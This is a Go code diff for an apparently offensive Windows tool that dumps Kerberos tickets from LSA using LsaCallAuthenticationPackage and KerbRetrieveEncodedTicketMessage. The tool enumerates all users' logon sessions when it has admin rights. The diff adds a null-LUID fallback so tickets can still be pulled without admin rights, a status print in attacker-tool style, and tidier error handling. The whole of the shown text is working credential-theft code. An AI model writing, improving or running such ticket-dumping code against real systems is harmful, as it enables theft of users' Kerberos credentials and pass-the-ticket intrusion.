@@ -490,6 +490,9 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		return nil, fmt.Errorf("invalid LSA handle")
 	}
 
+	// Check if running with admin privileges
+	isAdmin, _ := isAdmin()
+
 	// Convert target name to UTF16 and calculate sizes
 	targetNameUTF16 := windows.StringToUTF16(targetName)
 	nameLen := uint16(len(targetNameUTF16) * 2) // Length in bytes
@@ -505,7 +508,14 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	// Set up the request at the start of the buffer
 	request := (*KerbRetrieveTktRequest)(bufferPtr)
 	request.MessageType = KerbRetrieveEncodedTicketMessage
-	request.LogonId = luid
+
+	// If not admin, use null LUID
+	if !isAdmin {
+		request.LogonId = windows.LUID{} // Use 0:0 LUID for current session
+	} else {
+		request.LogonId = luid
+	}
+
 	request.TicketFlags = 0
 	request.CacheOptions = KerbRetrieveTicketAsKerbCred
 	request.EncryptionType = 0
@@ -527,6 +537,8 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 	var responsePtr uintptr
 	var returnLength uint32
 	var protocolStatus uint32
+
+	fmt.Printf("[*] Attempting to extract ticket for %s (Admin: %v)\n", targetName, isAdmin)
 
 	ret, _, _ := LsaCallAuthenticationPackage.Call(
 		uintptr(lsaHandle),
@@ -569,21 +581,21 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCred, error) {
 	var luids []windows.LUID
 	var sessionCreds []SessionCred
+
 	isAdmin, err := isAdmin()
 	if err != nil {
-		return sessionCreds, fmt.Errorf("[-] failed to check if admin is enabled, err: %v\n", err)
+		return sessionCreds, fmt.Errorf("failed to check if admin is enabled: %v", err)
 	}
+
 	if isAdmin {
-		//fmt.Printf("[!] elevated token. listing sessionCreds for all users\n\n")
 		luids, err = enumerateLogonSessions()
 		if err != nil {
-			return sessionCreds, fmt.Errorf("[-] failed to enumerate logon ids, err: %v\n", err)
+			return sessionCreds, fmt.Errorf("failed to enumerate logon ids: %v", err)
 		}
 	} else {
-		//fmt.Printf("[-] low priv token. listing sessionCreds for current user\n\n")
 		luid, err := getCurrentLUID()
 		if err != nil {
-			return sessionCreds, fmt.Errorf("[-] failed to get current luid, err: %v\n", err)
+			return sessionCreds, fmt.Errorf("failed to get current luid: %v", err)
 		}
 		luids = append(luids, luid)
 	}
